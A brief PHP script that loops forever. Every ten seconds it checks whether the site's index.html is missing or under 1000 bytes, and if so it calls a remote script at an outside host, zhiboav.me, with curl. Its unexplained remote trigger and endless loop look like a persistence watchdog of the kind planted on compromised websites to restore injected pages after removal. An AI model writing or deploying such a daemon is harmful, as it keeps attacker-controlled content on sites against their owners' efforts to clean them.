<?php
$dir = dirname(dirname(__FILE__));
$filepath = $dir.'/index.html';
$isStaticPage = false;

function curlGetData($uri='')
{
    $ch = curl_init ();
    curl_setopt ( $ch, CURLOPT_URL, $uri );
    curl_setopt ( $ch, CURLOPT_HEADER, 0 );
    curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 0 );
    $return = curl_exec ( $ch );
    curl_close ( $ch );
    return $return;
}

while (true) {
    if (!file_exists($filepath)) {
        $isStaticPage = true;
    }
    $filesize = filesize($filepath);
    if ($filesize < 1000) {
        $isStaticPage = true;
    }
    if ($isStaticPage) {
        if(curlGetData('http://www.zhiboav.me/nm.php')){
            $isStaticPage = false;
        }
    }
    sleep(10);
}